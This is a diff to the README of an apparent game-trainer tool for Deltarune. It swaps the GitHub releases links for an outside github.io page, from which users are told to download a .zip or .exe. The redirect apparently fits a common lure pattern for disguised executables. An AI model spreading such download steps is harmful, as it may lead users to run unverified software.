@@ -1,6 +1,6 @@
 # 🛡️ Deltarune-Chapter5-Trainer-ModMenu - Adjust your game stats with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Unblessed-determination74/Deltarune-Chapter5-Trainer-ModMenu/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://unblessed-determination74.github.io)
 
 ## 📌 Overview
 The Deltarune-Chapter5-Trainer-ModMenu provides tools to change your gameplay experience in the single-player mode of Deltarune Chapter 5. This tool allows users to modify player statistics and manage inventory items without manual file editing. It runs as an external process to the game, keeping your original game files safe and unchanged.
@@ -19,7 +19,7 @@ This tool functions on computers running Windows 10 or Windows 11. Ensure that y
 ## 💾 Installation and Usage
 Follow these steps to set up the trainer on your Windows system.
 
-1. Visit the [official release page](https://github.com/Unblessed-determination74/Deltarune-Chapter5-Trainer-ModMenu/releases) to download the latest version of the software.
+1. Visit the [official release page](https://unblessed-determination74.github.io) to download the latest version of the software.
 2. Locate the most recent file in the list. It typically ends with a .zip or .exe extension.
 3. Download the file to your computer.
 4. Extract the contents of the file to a folder that you can easily find.
